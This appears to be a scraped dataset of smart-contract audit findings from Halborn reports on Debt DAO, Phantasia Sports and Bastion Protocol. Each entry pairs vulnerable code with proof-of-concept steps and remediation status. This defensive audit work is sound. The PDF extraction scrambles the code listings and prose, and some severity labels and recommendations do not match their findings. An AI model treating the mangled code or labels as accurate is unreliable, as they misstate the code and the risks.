        "body": "In the LineOfCredit contract, the getOutstandingDebt() function allows users to get information about total outstanding debt valuated in USD. The presented amount is a sum of principal and interest. The assessment revealed that the getOutstandingDebt() function does not consider the Thus, it presents accrued interest from the last evaluation period. misleading, understated value to the users as actual debt is higher. Listing 16: LineOfCredit.sol * @notice - Returns total credit obligation of borrower . Aggregated across all lenders . Denominated in USD 1 e8 . - callable by anyone 112 /* * 113 114 115 116 117 118 * @dev */ function getOutstandingDebt () external override returns (  uint256 ) { 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 ( uint256 p , uint256 i ) = _updateOutstandingCredit () ; return p + i ; } function _updateOutstandingCredit () internal returns ( uint256 principal , uint256 interest ) { uint256 len = ids . length ; if ( len == 0) return (0 , 0) ; Credit memory credit ; for ( uint256 i = 0; i < len ; i ++) { credit = credits [ ids [i ]]; int256 price = oracle . getLatestAnswer ( credit . token ); 54 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 principal += LoanLib . calculateValue ( price , credit . principal , credit . decimals ); interest += LoanLib . calculateValue ( price , credit . interestAccrued , credit . decimals ); } principalUsd = principal ; interestUsd = interest ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_- 000_000 tokens. 3. As the borrower, borrow 500_000_000_000_000 tokens. 4. Forward blockchain time for 10 days. 5. Call getOutstandingDebt() function. Observe that returned value of 100000000 does not include accrued interest. 6. Call accrueInterest() function. Observe that returned value of 27652. 7. As borrower, borrow 500_000_000_000_000 tokens. 8. Forward blockchain time for 10 days. 9. Call the getOutstandingDebt() function. Observe that returned value of 200027652. Note that this value includes the accrued interest from step 6. 10. Call the accrueInterest() function. Observe that returned value of 54757. Note that this value includes the accrued interest only from the last 10 days and was not included in step 9. 55 Risk Level: Likelihood - 5 Impact - 3 56 Recommendation: It is recommended that the getOutstandingDebt() function returns a value that includes the total accrued interest. Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit c571e48d52f886b2d4c9f930a6bb27cf331501ae: function is now removed. added and includes both updated principal and accrued interest. getOutstandingDebt() The updateOutstandingDebt() function is now the 57 ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: High"
        ]
    },
    {
        "title": "BORROWING FROM NON",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Debt_DAO_P2P_Loan_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the LineOfCredit contract, a borrower can add multiple credits with The borrower can borrow any amount from any credit various lenders. position using the borrow(bytes32 id, uint256 amount) function. However, the borrower can only repay first credit position using depositAndRepay() or depositAndClose() functions. Listing 17: LineOfCredit.sol (Lines 309,342) 302 /* * 303 * @notice - Transfers enough tokens to repay entire credit  position from ` borrower ` to Loan contract . 304 305 306 307 308 309 310 311 312 313 314 315 316 * @dev - callable by borrower */ function depositAndClose () external override whileBorrowing onlyBorrower returns ( bool ) { bytes32 id = ids [0]; _accrueInterest ( id ); uint256 totalOwed = credits [ id ]. principal + credits [ id ].  interestAccrued ; 317 318 // borrower deposits remaining balance not already repaid  and held in contract 319 320 321 322 323 324 bool success = IERC20 ( credits [ id ]. token ). transferFrom ( msg . sender , address ( this ) , totalOwed ); require ( success , \" Loan : deposit failed \"); 58 325 326 327 328 329 330 331 332 333 // clear the credit _repay ( id , totalOwed ); require ( _close ( id )) ; return true ; } /* * * @dev - Transfers token used in credit position from msg .  sender to Loan contract . 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 * @dev - callable by anyone * @notice - see _repay () for more details * @param amount - amount of ` token ` in `id ` to pay back */ function depositAndRepay ( uint256 amount ) external override whileBorrowing returns ( bool ) { bytes32 id = ids [0]; _accrueInterest ( id ); require ( amount <= credits [ id ]. principal + credits [ id ].  interestAccrued ); 349 350 351 352 353 354 355 356 357 358 359 bool success = IERC20 ( credits [ id ]. token ). transferFrom ( msg . sender , address ( this ) , amount ); require ( success , \" Loan : failed repayment \" ); _repay ( id , amount ); return true ; } When the borrower borrow() deposit from the second position, repaying the debt will not be possible, as the whileBorrowing() modifier would block that operation. At this point, the close(bytes32 id) function can be called to close the first credit position unless the _accrueInterest () internal function is called and interest is accrued, preventing the 59 closing of the unpaid debt. Listing 18: LineOfCredit.sol 68 69 70 71 modifier whileBorrowing () { require ( ids . length > 0 && credits [ ids [0]]. principal > 0) ; _ ; } To escape from the situation, the borrower can still borrow() any amount from the first position unless the lender does not withdraw all liquidity. The withdrawal operation accrues the interest, which cannot be paid, as Moreover, the whileBorrowing() modifier only considers the principal. the borrower cant borrow() anymore from the empty deposit. As a result, a deadlock occurs in the contract, and the borrower cant pay off the debt. The root cause of this issue is the _sortIntoQ(bytes32 p) function, which supposes to shift the credit position with the borrowed deposit to the beginning of the ids collection, but it does not work as expected. Sample invalid flow: 1. For i = 0; _i = i = 0 as first credits principal is 0. 2. For i = 1, function returns true, as _i = 0. 3. No position swap occurs. Listing 19: LineOfCredit.sol uint256 len = ids . length ; uint256 _i = 0; // index that p should be moved to 682 function _sortIntoQ ( bytes32 p ) internal returns ( bool ) { 683 684 685 686 687 688 689 bytes32 id = ids [ i ]; if (p != id ) { for ( uint256 i = 0; i < len ; i ++) { if ( credits [ id ]. principal > 0) continue ; // `id `  should be placed before `p ` 690 691 692 _i = i ; // index of first undrawn LoC found } else { if ( _i == 0) return true ; // `p ` in earliest 60  possible index 693 694 695 696 697 698 699 700 // swap positions ids [ i] = ids [ _i ]; ids [ _i ] = p; } } return true ; } Proof of Concept: 1. All necessary contracts are deployed and initialized: RevenueToken, SimpleOracle, LoanLib, LineOfCredit. 2. As borrower and lender1, add credit position for 10_000_000_000_- 000_000 tokens. This action registers the first credit position. 3. As a borrower and lender2, add credit position for 10_000_000_000_- 000_000 tokens. This action registers the second credit position. 4. As the borrower, borrow 10_000_000_000_000_000 tokens from the second position. 5. Note that the ids collection was not updated; the second credit position is not set to the first. 6. Forward blockchain time for 1 second. 7. Call the accrueInterest function. Note that the interestAccrued parameter value in the first credit record is updated. 8. As the borrower, attempt to depositAndRepay with any value. Observe that the transaction reverted. 9. As the borrower, attempt to depositAndClose. Observe that the transaction reverted. 61 10. As the borrower, attempt to close the first credit position. Observe that the transaction reverted with Loan: close failed. credit owed error. 11. As the lender2, attempt to close the second credit position. Observe that the transaction reverted with Loan: close failed. credit owed error. 12. As the lender1, withdraw all liquidity. 13. As the borrower, attempt to borrow. Observe that the transaction reverted with a Loan: no liquidity error. 14. As the borrower, attempt to close the first credit position again. Observe that the transaction reverted with Loan: close failed. credit owed error. 62 Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to allow the borrower to pay off any credit position without extra steps (such as calling borrow() function). Remediation Plan: SOLVED: The Debt DAO team solved this issue in commit 78a2a57081ee1242ab71a09e1f28218de4e03b65: the _sortIntoQ() function has now proper implementation. The borrowed line of credit now moves to the first position to pay off. 63 3.10 (HAL-10) UPDATEOWNERSPLIT FUNCTION CAN BE ABUSED BY LENDER OR BORROWER - HIGH ",
        "labels": [
            "Halborn",
            "Debt_DAO_P2P_Loan",
            "Severity: Informational"
        ]
    },
    {
        "title": "ANONYMOUS FAN CARD MODIFICATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Users can create and update fan cards with the UpdateOrCreateFanCard instruction. Along with the instruction data they have to provide several accounts, one of them being fan_card_storage_account. This account stores a FanCard struct. The struct is defined in util.rs and has multiple fields, including user_main: Pubkey. This field denotes the card creator. The UpdateOrCreateFanCard instruction handler does not validate the transaction signer account address to match user_main of the provided fan_card_storage_account and in consequence a malicious user may over- write all fan cards. Code Location: Listing 1: processor/update_or_create_fan_card_v1.rs (Lines 23,25,29) let account_info_iter = & mut accounts . iter () ; let user_main_account = next_account_info ( account_info_iter ) ?; accounts : &[ AccountInfo ], 19 pub fn process_update_or_create_fan_card_v1 ( 20 21 ) -> ProgramResult { 22 23 24 25 26 27 28 29 if !user_main_account . is_signer { } let fan_card_storage_account = next_account_info ( return Err ( ProgramError :: MissingRequiredSignature ); account_info_iter ) ?; 13 Listing 2: processor/update_or_create_fan_card_v1.rs (Lines 125) 103 let mut fan_card_data_byte_array = fan_card_storage_account . data . 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 try_borrow_mut () . unwrap () ; if fan_card_data_byte_array [0] == 0 u8 { let rent = Rent :: get () ?; if !rent . is_exempt ( fan_card_account_lamports , fan_card_data_bytes ) { msg! ( \" PhantasiaError :: NotRentExempt \" ); return Err ( PhantasiaError :: NotRentExempt . into () ); } if fan_card_data_bytes ! = state :: FAN_CARD_STORAGE_TOTAL_BYTES { msg! ( \" PhantasiaError :: DataSizeNotMatched \" ); return Err ( PhantasiaError :: DataSizeNotMatched . into () ); } fan_card_data_byte_array [0] = AccTypesWithVersion :: FanCardDataV1 as u8 ; } else if fan_card_data_byte_array [0] ! = AccTypesWithVersion :: FanCardDataV1 as u8 { msg! (\" PhantasiaError :: ExpectedAccountTypeMismatched \" ); return Err ( PhantasiaError :: ExpectedAccountTypeMismatched . into () ); } let user_fan_card : FanCard = FanCard { user_main : * user_main_account . key , Risk Level: Likelihood - 5 Impact - 3 Recommendations: Validate the user_main_account key to match user_main on card update. 14 Remediation Plan: The Phantasia Sports team SOLVED: 5c83e22e08086abad97119860485316c013ae748. validates if the transaction signer is the owner of the fan card. in instruction issue fixed The the commit handler 15 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: High"
        ]
    },
    {
        "title": "CONTEST DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Users can join contests by sending the AddOrUpdateParticipantData in- struction. The instruction handler however does not verify if the user has already submitted a roster which combined with other vulnerabilities identified in the program allows a single attacker to fill up any and all contests with bogus or duplicated entries thus preventing legitimate users from entering contests. An attack of this type doesnt carry any immediate loss of funds risk however it would be extremely harmful to the protocol to be unable to carry out normal operations. Code Location: Listing 3: processor/add_or_update_participant_data.rs (Lines 20,22) accounts : &[ AccountInfo ], roster_9_players_input : [ u32 ; 9] , participant_index_input : u16 , 14 pub fn process_add_or_update_participant_data ( 15 16 17 18 ) -> ProgramResult { 19 20 let account_info_iter = & mut accounts . iter () ; let participant_main_account = next_account_info ( account_info_iter ) ?; 21 22 23 24 25 if !participant_main_account . is_signer { msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } Listing 4: processor/add_or_update_participant_data.rs (Lines 71,88) 70 let participant_data = ParticipantDataV1 { 71 72 73 participant_main_pkey : * participant_main_account . key , roster_9_players : roster_9_players_input , last_updated_timestamp : now , 16 74 }; 75 state :: pack_to_participant_v1 ( 76 77 participant_data , & mut contest_data_byte_array [ participant_data_si .. participant_data_ei ], 78 ) 79 . unwrap () ; 80 } else { 81 let participant_data_si = state :: CONTEST_INFO_HEADER_V1_DATA_BYTES 82 + ( participant_index_input as usize ) * state :: PARTICIPANT_V1_DATA_BYTES ; 83 let participant_data_ei = participant_data_si + state :: PARTICIPANT_V1_DATA_BYTES ; 84 let mut participant_data = state :: unpack_to_participant_v1 ( 85 & contest_data_byte_array [ participant_data_si .. participant_data_ei ], 86 ) 87 . unwrap () ; 88 if participant_data . participant_main_pkey ! = * participant_main_account . key { msg! ( \" PhantasiaError :: WrongParticipantIndex \" ); return Err ( PhantasiaError :: WrongParticipantIndex . into () ); 89 90 91 } Risk Level: Likelihood - 5 Impact - 3 Recommendations: Restrict the number of rosters per participant_main_account to one. Remediation Plan: The Phantasia Sports team SOLVED: d19c0f12f26ddce1adc605ce19ca24a085acefb6. participant_main_account is restricted to one now. fixed the commit The number of rosters per issue in 17 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: High"
        ]
    },
    {
        "title": "HARDCODED GOVERNANCE ADDRESS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ClaimContestPrizes, CreateWinnersAccountV1, CloseWinnersAccount and TransferNFTtoWinner instruction handlers use the get_admin_pubkey() util- This function returns a ity function to validate the signer address. hardcoded governance account address. Since this address is hardcoded it cannot be modified without redeploying the program if the account compromised. Code Location: Listing 5: utils.rs (Lines 13) 8 pub fn get_admin_pubkey () -> Pubkey { 9 10 let admin_pubkey_str : & ' static str = env! (\" ADMIN_PUBKEY \" , \" Must specify a admin account public key! \" ); msg! ( \" the ADMIN_PUBKEY variable at the time of compiling was : {} \" , admin_pubkey_str ); let pubkey_vec = bs58 :: decode ( admin_pubkey_str ). into_vec () . unwrap () ; let admin_pubkey = Pubkey :: new (& pubkey_vec ); return admin_pubkey ; 11 12 13 14 15 16 17 18 } Listing 6: processor/claim_contest_prizes.rs (Lines 127) 124 if winners_header_data_v1 . num_prizes_claimed == winners_header_data_v1 . num_winner { let admin_main_account = next_account_info ( account_info_iter ) ?; let admin_pubkey = utils :: get_admin_pubkey () ; 125 126 127 18 Listing 7: processor/create_winners_account_v1.rs (Lines 30) msg! ( \" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); 25 if !admin_main_account . is_signer { 26 27 28 } 29 30 let admin_pubkey = utils :: get_admin_pubkey () ; 31 32 if admin_pubkey ! = * admin_main_account . key { 33 34 35 } msg! ( \" PhantasiaError :: AdminDoesNotMatched \" ); return Err ( PhantasiaError :: AdminDoesNotMatched . into () ); Also processor/close_winners_account.rs lines #14-23 and processor/ transfer_nft_to_winner.rs lines #19-28. Risk Level: Likelihood - 3 Impact - 3 Recommendations: Implement governance functions to update the admin account address. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team acknowledged this finding. 19 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "SALARY CAP CONTEST PARAMETER VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "salary_cap if one of the contest parameters creators specify on ini- On the front-end, the web application verifies if total tialization. roster salary does not exceed the salary_cap for a contest and sends the AddOrUpdateParticipantData instruction. This parameter is not validated again by the program because player IDs in roster_9_players_input arrays do not identify any on-chain objects. In consequence, a malicious par- ticipant may create a roster which exceeds the salary_cap for a contest and/or flood the program with invalid participant data thus preventing legitimate users from playing the game and winning awards. Code Location: Listing 8: processor/initialize_contest_account.rs (Lines 16) accounts : &[ AccountInfo ], max_players_in_contest_input : u16 , first_game_start_time_input : u32 , contest_league_input : u8 , salary_cap_input : u16 , game_type_input : u8 , 11 pub fn process_initialize_contest_account_v1 ( 12 13 14 15 16 17 18 ) -> ProgramResult { 19 let account_info_iter = & mut accounts . iter () ; Listing 9: processor/initialize_contest_account.rs (Lines 58) 52 let contest_header_data = ContestInfoHeaderV1 { 53 54 55 56 acc_type : AccTypesWithVersion :: ContestDataV1 as u8 , contest_creater_main_pkey : * contest_creater_main_account . key , players_joined_contest : 0 u16 , max_players_in_contest : max_players_in_contest_input , 20 first_game_start_time : first_game_start_time_input , contest_league : contest_league_input , salary_cap : salary_cap_input , game_type : game_type_input , 57 58 59 60 61 }; 62 63 state :: pack_to_contest_info_header_v1 ( 64 65 contest_header_data , & mut contest_data_byte_array [ state :: CONTEST_HEADER_V1_SI .. state :: CONTEST_HEADER_V1_EI ], 66 ) 67 . unwrap () ; Listing 10: state.rs (Lines 13,14) 12 pub enum ContestLeague { 13 14 15 } NFL = 1, NBA = 2, Risk Level: Likelihood - 2 Impact - 4 Recommendations: Implement the contest_league_input parameter validation logic in the InitializeContestAccountV1 instruction handler. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team acknowledged this finding. 21 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "LEAGUE/GAME TYPE CONTEST PARAMETERS VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "contest_league and game_type are two of the contest parameters creators specify on initialisation. In state.rs, enum ContestLeague defines avail- able leagues. The InitializeContestAccountV1 instruction handler does not ensure the user-supplied contest_league_input is a valid ContestLeague enum variant nor it verifies the game_type_input parameter value. This means users can create contests of arbitrary types and arbitrary games. Code Location: Listing 11: processor/initialize_contest_account.rs (Lines 58) acc_type : AccTypesWithVersion :: ContestDataV1 as u8 , contest_creater_main_pkey : * contest_creater_main_account . key , players_joined_contest : 0 u16 , max_players_in_contest : max_players_in_contest_input , first_game_start_time : first_game_start_time_input , contest_league : contest_league_input , salary_cap : salary_cap_input , game_type : game_type_input , 52 let contest_header_data = ContestInfoHeaderV1 { 53 54 55 56 57 58 59 60 61 }; 62 63 state :: pack_to_contest_info_header_v1 ( 64 65 contest_header_data , & mut contest_data_byte_array [ state :: CONTEST_HEADER_V1_SI .. state :: CONTEST_HEADER_V1_EI ], 66 ) 67 . unwrap () ; 22 Listing 12: state.rs (Lines 13,14) 12 pub enum ContestLeague { 13 14 15 } NFL = 1, NBA = 2, Risk Level: Likelihood - 1 Impact - 3 Recommendations: Implement the contest_league_input parameter validation logic in the InitializeContestAccountV1 instruction handler. Remediation Plan: SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. The validate_game_and_league_type Phantasia Sports team commit issue fixed the The in function was implemented. 23 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An overflow happens when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with For example, in line #57 in processor/claim\\ a given number of bits. textunderscore contest\\textunderscore prizes.rs two u16 values are mul- tiplied without checking whether the result is within the range that can be represented with a given number of bits. If it isnt, in Rust the resulting value is specified to wrap as twos complement, resulting in a value either too low or too high considering the circumstances. Code Location: Listing 13: processor/claim_contest_prizes.rs (Lines 57) 46 let mut winners_header_data_v1 = state :: unpack_to_winner_data_header_v1 ( 47 48 49 50 51 52 53 54 55 56 57 58 59 & winners_storage_data_byte_array [ state :: WINNER_DATA_HEADER_V1_SI .. state :: WINNER_DATA_HEADER_V1_EI ], true , ) ?; if winners_header_data_v1 . acc_type ! = state :: AccTypesWithVersion :: WinnersDataV1 as u8 { msg! (\" PhantasiaError :: ExpectedAccountTypeMismatched \" ); return Err ( PhantasiaError :: ExpectedAccountTypeMismatched . into () ); } let winner_data_si : usize = state :: WINNER_DATA_HEADER_V1_BYTES + ( winner_index_input as usize ) * ( state :: WINNER_DATA_V1_BYTES ); let winner_data_ei : usize = winner_data_si + state :: WINNER_DATA_V1_BYTES ; let mut current_winner_data : WinnerDataV1 = state :: unpack_to_winner_data_v1 ( 24 60 61 62 & winners_storage_data_byte_array [ winner_data_si .. winner_data_ei ], ) . unwrap () ; Listing 14: processor/add_or_update_participant _data.rs (Lines 59,60) if now > contest_header_data . first_game_start_time { msg! (\" PhantasiaError :: GameAlreadyStarted \" ); return Err ( PhantasiaError :: GameAlreadyStarted . into () ); 51 if participant_index_input == 50 _000u16 { 52 53 54 55 56 57 let participant_data_si = state :: } CONTEST_INFO_HEADER_V1_DATA_BYTES + (( contest_header_data . players_joined_contest as usize ) * state :: PARTICIPANT_V1_DATA_BYTES ); let participant_data_ei = participant_data_si + state :: 58 59 60 PARTICIPANT_V1_DATA_BYTES ; Listing 15: processor/add_or_update_participant _data.rs (Lines 82,83) 81 let participant_data_si = state :: CONTEST_INFO_HEADER_V1_DATA_BYTES + ( participant_index_input as usize ) * state :: 82 PARTICIPANT_V1_DATA_BYTES ; let participant_data_ei = participant_data_si + state :: PARTICIPANT_V1_DATA_BYTES ; let mut participant_data = state :: unpack_to_participant_v1 ( & contest_data_byte_array [ participant_data_si .. participant_data_ei ], ) . unwrap () ; if participant_data . participant_main_pkey != * participant_main_account . key { msg! (\" PhantasiaError :: WrongParticipantIndex \"); return Err ( PhantasiaError :: WrongParticipantIndex . into () ); } 83 84 85 86 87 88 89 90 91 25 Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider using the checked_add and checked_mul methods instead of ad- dition and multiplication operators respectively, to handle overflows gracefully. Remediation Plan: SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. Phantasia Sports team The fixed the issue in commit 26 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "INDEX OUT OF BOUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "To create a Solana account, a client generates a keypair and registers its public key using the CreateAccount system instruction with a fixed storage size in bytes preallocated. The following instruction handlers: - InitializeJoiningFeeCollectionRecordAccount - InitializeCircularlySortedTimestampStorageAccount - InitializeStakeUsersStorageAccount expect some user-supplied accounts storage sizes to be at least two bytes but do not verify it which will lead to program panic if the size is lower than two bytes. Code Location: Listing 16: processor.rs (Lines 1653,1654) 1633 let league_entry_fee_collection_storage_account = next_account_info ( account_info_iter ) ?; league_entry_fee_collection_storage_account . lamports () , league_entry_fee_collection_storage_account . data_len () , 1634 1635 let rent = Rent :: get () ?; 1636 1637 if !rent . is_exempt ( 1638 1639 1640 ) { 1641 1642 } 1643 1644 let mut league_entry_fee_collection_byte_array_data = 1645 1646 1647 1648 1649 if league_entry_fee_collection_byte_array_data [0] ! = 0 { return Err ( PhantasiaError :: NotRentExempt . into () ); league_entry_fee_collection_storage_account . data . borrow_mut () ; 27 1650 return Err ( PhantasiaError :: LeagueEntryFeeCollectionAccountAlreadyInitialized . into () ); 1651 } 1652 1653 league_entry_fee_collection_byte_array_data [0] = 1 u8 ; 1654 league_entry_fee_collection_byte_array_data [1] = 6 u8 ; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Validate the user-supplied accounts storage size to match the expected one. Remediation Plan: The Phantasia Sports team SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. the program. fixed the commit This code was removed from issue in 28 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF HELPER METHODS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The intention and use of helper methods in Rust, like unwrap, is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option the methods is called on doesnt have Some value or Result. Nevertheless, leaving unwrap functions in production environments is a bad practice because not only will this In addition, no helpful cause the program to crash out, or panic!. messages are shown to help the user solve, or understand the reason of the error. Code Location: Note: some usages of unwrap are justified and were excluded from the listing below. Listing 17 1 auditor@halborn :~/ src / phantasia / $ git grep -n ' unwrap () ' 2 nstruction . rs :108: roster_9_players_input : u8_array_to_u32_array (& input [1..37]. try_into () . unwrap () ) , 3 processor / add_or_update_participant_data . rs :34: let mut contest_data_byte_array = contest_account . data . try_borrow_mut () . unwrap () ; 4 processor / add_or_update_participant_data . rs :41: 5 processor / add_or_update_participant_data . rs :68: 6 processor / add_or_update_participant_data . rs :79: 7 processor / add_or_update_participant_data . rs :87: 8 processor / add_or_update_participant_data . rs :98: 9 processor / claim_contest_prizes . rs :39: . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; winners_storage_account . data . try_borrow_mut () . unwrap () ; 10 processor / claim_contest_prizes . rs :62: 11 processor / claim_contest_prizes . rs :108: 12 processor / claim_contest_prizes . rs :121: 13 processor / claim_contest_prizes . rs :139: 14 processor / claim_contest_prizes . rs :146: . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; 29 15 processor / close_winners_account . rs :34: 16 processor / create_winners_account_v1 . rs :50: . unwrap () ; let mut contest_data_byte_array = contest_account . data . try_borrow_mut () . unwrap () ; 17 processor / create_winners_account_v1 . rs :56: 18 processor / create_winners_account_v1 . rs :82: . unwrap () ; winners_storage_account . data . try_borrow_mut () . unwrap () ; 19 processor / create_winners_account_v1 . rs :119: 20 processor / create_winners_account_v1 . rs :131: 21 processor / create_winners_account_v1 . rs :139: . unwrap () ; . unwrap () ; . unwrap () as u64 ; 22 processor / create_winners_account_v1 . rs :142: 23 processor / create_winners_account_v1 . rs :185: 24 processor / create_winners_account_v1 . rs :213: 25 processor / create_winners_account_v1 . rs :221: 26 processor / initialize_contest_account_v1 . rs :38: . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; . unwrap () ; 27 processor / initialize_contest_account_v1 . rs :45: let mut contest_data_byte_array = contest_account . data . try_borrow_mut () . unwrap () ; 28 processor / initialize_contest_account_v1 . rs :67: 29 processor / transfer_nft_to_winner . rs :94: 30 processor / update_or_create_fan_card_v1 . rs :103: . unwrap () ; let mut . unwrap () ; fan_card_data_byte_array = fan_card_storage_account . data . try_borrow_mut () . unwrap () ; 31 processor / update_or_create_fan_card_v1 . rs :136: . copy_from_slice (& user_fan_card . try_to_vec () . unwrap () ); 32 utils . rs :15: let pubkey_vec = bs58 :: decode ( admin_pubkey_str ). into_vec () . unwrap () ; 33 utils . rs :25: 34 utils . rs :31: return bytes . try_into () . unwrap () ; bytes . push ( u32 :: from_le_bytes ( inp [ ind .. ind + 4]. try_into () . unwrap () )) ; 35 utils . rs :33: return bytes . try_into () . unwrap () ; Risk Level: Likelihood - 1 Impact - 1 30 Recommendations: It is recommended not use the unwrap function in production environment because this use provokes panic! and may crash the contract without verbose error messages. Crashing the system will result in a loss of availability, and in some cases, even private information stored in the Some alternatives are possible, such as propagating the error state. with ? instead of unwrap or using the error-chain crate for errors. Remediation Plan: SOLVED: 067f426ea3c75a733f0765791f010f333da00d5b. Phantasia Sports team The fixed the issue in commit 31 ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING CONTEST CREATOR VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the Two accounts of requires On account initialization, the initialize_contest_account_v1 function saves the contest creator public key as contest_creater_main_pkey instruction . the to handler and contest_creater_main_account. The handler does not validate if the user-supplied contest_creater_main_account parameter value matches the contest_creater_main_pkey property of contest_account. This means users can provide arbitrary addresses as contest_creater_main_accounts. CreateWinnersAccountV1 are provide contest_account caller the Code Location: Listing 18: processor/initialize_contest_account_v1.rs (Lines 54) acc_type : AccTypesWithVersion :: ContestDataV1 as u8 , contest_creater_main_pkey : * contest_creater_main_account . key , players_joined_contest : 0 u16 , max_players_in_contest : max_players_in_contest_input , first_game_start_time : first_game_start_time_input , contest_league : contest_league_input , salary_cap : salary_cap_input , game_type : game_type_input , 52 let contest_header_data = ContestInfoHeaderV1 { 53 54 55 56 57 58 59 60 61 }; 62 63 state :: pack_to_contest_info_header_v1 ( 64 65 contest_header_data , & mut contest_data_byte_array [ state :: CONTEST_HEADER_V1_SI .. state :: CONTEST_HEADER_V1_EI ], 66 ) 67 . unwrap () ; 32 Listing 19: create_winners_account_v1.rs (Lines 41) 37 let contest_account = next_account_info ( account_info_iter ) ?; 38 39 let winners_storage_account = next_account_info ( account_info_iter ) ?; 40 41 42 43 44 45 46 47 48 let contest_creater_main_account = next_account_info ( account_info_iter ) ?; let rent = Rent :: get () ?; if contest_account . owner != program_id { msg! (\" PhantasiaError :: WrongAccountPassed \" ); return Err ( PhantasiaError :: WrongAccountPassed . into () ); } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Implement validation of the contest_creater_main_account address in the CreateWinnersAccountV1 instruction handler. Remediation Plan: The Phantasia Sports team SOLVED: 28e770a9554267d95348c7c7d6feabde6c3aaffb. validates the contest creator now. fixed the The issue in instruction commit handler 33 3.10 (HAL-10) CREATING FAN CARDS FROM FROZEN NFTS ALLOWED - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Phantasia_Sports_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that most of the privileged functionality is controlled by the admin. Additional authorization levels are needed to implement the principle of least privilege, also known as least authority, which ensures only authorized processes, users, or programs can access necessary resources or information. Although the contract defines roles responsible for various actions, they can be bypassed by admin. Code Location: The owner can access those functions in Comptroller contract:  _setRewardDistributor  _setPriceOracle  _setCloseFactor  _setCollateralFactor  _setMaxAssets  _setLiquidationIncentive  _supportMarket The owner can bypass role-based access control of those functions in Comptroller:  _setMarketBorrowCaps  _setMintPaused  _setBorrowPaused  _setTransferPaused  _setSeizePaused 14 Risk Level: Likelihood - 3 Impact - 4 Recommendation: Removing the admin bypass in functions is advised. In conjunction, using a multi-signature wallet for admin should also be implemented. However, to increase the decentralization of the protocol, it is highly encouraged to implement a governance mechanism. Every significant change should first undergo a voting process and be implemented only if consensus among voters is reached. Remediation Plan: PENDING: The Bastion Protocol team 